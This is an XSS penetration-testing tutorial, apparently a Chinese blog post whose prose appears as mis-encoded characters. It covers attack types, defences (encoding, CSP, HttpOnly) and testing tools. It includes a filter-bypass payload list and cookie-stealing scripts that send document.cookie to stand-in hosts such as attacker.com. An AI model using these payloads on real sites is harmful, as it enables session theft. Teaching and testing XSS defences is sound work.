# ğŸ” æ¸—é€æµ‹è¯•çŸ¥è¯† #003

**æ—¥æœŸ**: 2026-02-20  
**ä¸»é¢˜**: XSS è·¨ç«™è„šæœ¬æ”»å‡»åŸºç¡€ä¸é˜²æŠ¤  
**æ ‡ç­¾**: #æ¸—é€æµ‹è¯• #XSS #ç½‘ç»œå®‰å…¨ #é“å¾·é»‘å®¢

---

## âš ï¸ é“å¾·ä¸æ³•å¾‹å£°æ˜

- **ä»…åœ¨å¯¹æ‚¨æ‹¥æœ‰ä¹¦é¢æˆæƒçš„ç³»ç»Ÿä¸Šä½¿ç”¨**
- æœªç»æˆæƒæ³¨å…¥è„šæœ¬å¯èƒ½è¿åã€Šç½‘ç»œå®‰å…¨æ³•ã€‹ç¬¬ 27 æ¡
- å­¦ä¹ è¯·åœ¨è‡ªå»ºå®éªŒç¯å¢ƒï¼ˆDVWAã€XSS æŒ‘æˆ˜å¹³å°ï¼‰
- å‘ç°æ¼æ´åŠæ—¶æŠ¥å‘Šï¼Œä¸åˆ©ç”¨ä¸ä¼ æ’­

---

## ğŸ› ï¸ XSS æ”»å‡»åŸç†

è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site Scriptingï¼‰å‘ç”Ÿåœ¨ç”¨æˆ·è¾“å…¥æœªç»è¿‡æ»¤ç›´æ¥è¾“å‡ºåˆ°é¡µé¢æ—¶ï¼š

```html
<!-- è„†å¼±ä»£ç ç¤ºä¾‹ -->
<div><?php echo $_GET['name']; ?></div>
<!-- æ”»å‡»è€…è¾“å…¥ï¼š<script>alert('XSS')</script> -->
```

---

## ğŸ” XSS ä¸‰ç§ç±»å‹

### 1ï¸âƒ£ åå°„å‹ XSSï¼ˆReflectedï¼‰

æ¶æ„è„šæœ¬é€šè¿‡ URL å‚æ•°åå°„åˆ°é¡µé¢ï¼Œéœ€è¦è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ï¼š

```bash
# æµ‹è¯• payload
curl "http://target.com/search?q=<script>alert('XSS')</script>"

# ç¼–ç ç»•è¿‡ï¼ˆURL ç¼–ç ï¼‰
curl "http://target.com/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"

# å¸¸è§ç»•è¿‡æŠ€å·§
curl "http://target.com/search?q=<img src=x onerror=alert(1)>"
curl "http://target.com/search?q=<svg onload=alert(1)>"
curl "http://target.com/search?q=<body onload=alert(1)>"
```

### 2ï¸âƒ£ å­˜å‚¨å‹ XSSï¼ˆStored/Persistentï¼‰

æ¶æ„è„šæœ¬è¢«å­˜å‚¨åˆ°æœåŠ¡å™¨ï¼ˆæ•°æ®åº“ã€è¯„è®ºã€ç•™è¨€æ¿ï¼‰ï¼Œæ‰€æœ‰è®¿é—®è€…éƒ½ä¼šæ‰§è¡Œï¼š

```bash
# æµ‹è¯•è¯„è®ºæ¡†æ³¨å…¥
curl -X POST "http://target.com/comment" \
  -d "comment=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"

# æµ‹è¯•ç”¨æˆ·åå­˜å‚¨
curl -X POST "http://target.com/register" \
  -d "username=<img src=x onerror=alert(1)>&password=test"
```

### 3ï¸âƒ£ DOM å‹ XSS

æ¶æ„è„šæœ¬åœ¨å®¢æˆ·ç«¯ JavaScript ä¸­æ‰§è¡Œï¼Œä¸ç»è¿‡æœåŠ¡å™¨ï¼š

```javascript
// è„†å¼±ä»£ç ç¤ºä¾‹
var search = document.location.hash.substring(1);
document.getElementById('result').innerHTML = search;

// æ”»å‡» URL
http://target.com/page#<img src=x onerror=alert(1)>
```

---

## ğŸ¯ XSS æ£€æµ‹ Payload æ¸…å•

### åŸºç¡€æµ‹è¯•

```html
<script>alert('XSS')</script>
<svg/onload=alert('XSS')>
<img src=x onerror=alert('XSS')>
<body/onload=alert('XSS')>
<input onfocus=alert(1) autofocus>
```

### ç»•è¿‡è¿‡æ»¤å™¨

```html
<!-- å¤§å°å†™æ··åˆ -->
<ScRiPt>alert(1)</ScRiPt>

<!-- åŒå†™ç»•è¿‡ -->
<script<script>>alert(1)</script>

<!-- ä½¿ç”¨åå¼•å· -->
<script>alert`XSS`</script>

<!-- ç¼–ç ç»•è¿‡ï¼ˆHTML å®ä½“ï¼‰ -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Unicode ç¼–ç  -->
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### Cookie çªƒå–æµ‹è¯•ï¼ˆä»…æˆæƒç¯å¢ƒï¼‰

```html
<script>
  document.location='http://your-server.com/steal?c='+document.cookie;
</script>

<script>
  fetch('http://your-server.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>
```

---

## ğŸ›¡ï¸ é˜²æŠ¤æ–¹æ³•

### 1ï¸âƒ£ è¾“å‡ºç¼–ç ï¼ˆOutput Encodingï¼‰

```php
// PHP - ä½¿ç”¨ htmlspecialchars
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// è¾“å‡ºåˆ° HTML å†…å®¹
echo htmlentities($user_input, ENT_QUOTES, 'UTF-8');

// è¾“å‡ºåˆ° JavaScript å˜é‡
echo json_encode($user_input);
```

```python
# Python - Jinja2 æ¨¡æ¿ï¼ˆè‡ªåŠ¨è½¬ä¹‰ï¼‰
{{ user_input }}  # è‡ªåŠ¨è½¬ä¹‰

# æ˜¾å¼è½¬ä¹‰
from markupsafe import escape
safe_output = escape(user_input)
```

### 2ï¸âƒ£ è¾“å…¥éªŒè¯ï¼ˆInput Validationï¼‰

```php
// ç™½åå•éªŒè¯
$allowed_tags = ['b', 'i', 'u', 'strong'];
$clean_html = strip_tags($user_input, '<' . implode('><', $allowed_tags) . '>');

// åªå…è®¸å­—æ¯æ•°å­—
if (!preg_match('/^[a-zA-Z0-9]+$/', $input)) {
    die("Invalid input");
}
```

### 3ï¸âƒ£ Content Security Policy (CSP)

```html
<!-- HTTP Header -->
Content-Security-Policy: default-src 'self'; script-src 'self'

<!-- Meta æ ‡ç­¾ -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

```nginx
# Nginx é…ç½®
add_header Content-Security-Policy "default-src 'self'; script-src 'self';" always;
```

### 4ï¸âƒ£ HttpOnly Cookie æ ‡å¿—

```php
// PHP è®¾ç½® HttpOnly Cookie
setcookie('session', $value, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

---

## ğŸ”§ XSS æµ‹è¯•å·¥å…·

### XSStrikeï¼ˆPythonï¼‰

```bash
# å®‰è£…
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike && pip install -r requirements.txt

# åŸºç¡€æ‰«æ
python xsstrike.py -u "http://target.com/search?q=test"

# è¯¦ç»†æ‰«æ
python xsstrike.py -u "http://target.com/search?q=test" --fuzzer --level 3

# POST è¯·æ±‚
python xsstrike.py -u "http://target.com/login" --data "username=test&password=test"
```

### Burp Suite

```
1. é…ç½®æµè§ˆå™¨ä»£ç†åˆ° Burp (127.0.0.1:8080)
2. å¼€å¯ Intercept æ•è·è¯·æ±‚
3. ä½¿ç”¨ Scanner è‡ªåŠ¨æ£€æµ‹ XSS
4. ä½¿ç”¨ Repeater æ‰‹åŠ¨æµ‹è¯• payload
```

---

## ğŸ“– å­¦ä¹ èµ„æº

| èµ„æº | é“¾æ¥ | è¯´æ˜ |
|------|------|------|
| XSS Challenge | xss-challenge.com | XSS ç»•è¿‡æŒ‘æˆ˜å¹³å° |
| PortSwigger XSS Lab | portswigger.net | å…è´¹ XSS å®éªŒè¯¾ç¨‹ |
| OWASP XSS Cheat Sheet | owasp.org | å®Œæ•´ Payload æ¸…å• |
| DVWA | dvwa.co.uk | å« XSS æ¨¡å—çš„æ¼æ´ç¯å¢ƒ |
| Google XSS Game | xss-game.appspot.com | äº’åŠ¨å¼å­¦ä¹ æ¸¸æˆ |
| HackTheBox | hackthebox.com | å®æˆ˜æ¸—é€æµ‹è¯•å¹³å° |

---

## ğŸ’¡ æœ€ä½³å®è·µ

âœ“ **å§‹ç»ˆè·å–ä¹¦é¢æˆæƒ** - æ˜ç¡®æµ‹è¯•èŒƒå›´å’Œæ—¶é—´çª—å£  
âœ“ **ä½¿ç”¨å®éªŒç¯å¢ƒ** - DVWAã€XSS æŒ‘æˆ˜å¹³å°ã€æœ¬åœ° Docker  
âœ“ **è®°å½•æ‰€æœ‰æ“ä½œ** - æ—¶é—´æˆ³ã€Payloadã€ç»“æœæˆªå›¾  
âœ“ **éµå®ˆ scope** - ä¸æµ‹è¯•æœªæˆæƒç³»ç»Ÿ  
âœ“ **è´Ÿè´£ä»»æŠ«éœ²** - å‘ç°æ¼æ´é€šè¿‡æ­£è§„æ¸ é“æŠ¥å‘Š  
âœ“ **é˜²å¾¡ä¼˜å…ˆ** - å­¦ä¹ æ”»å‡»æ˜¯ä¸ºäº†æ›´å¥½é˜²å¾¡  

---

## ğŸ¯ æ˜æ—¥é¢„å‘Š

**CSRF è·¨ç«™è¯·æ±‚ä¼ªé€ ** - åŸç†ã€æ£€æµ‹æ–¹æ³•ä¸é˜²æŠ¤ç­–ç•¥

---

*æœ¬å†…å®¹ä»…ä¾›åˆæ³•å®‰å…¨å­¦ä¹ å’Œæˆæƒæ¸—é€æµ‹è¯•ä½¿ç”¨*
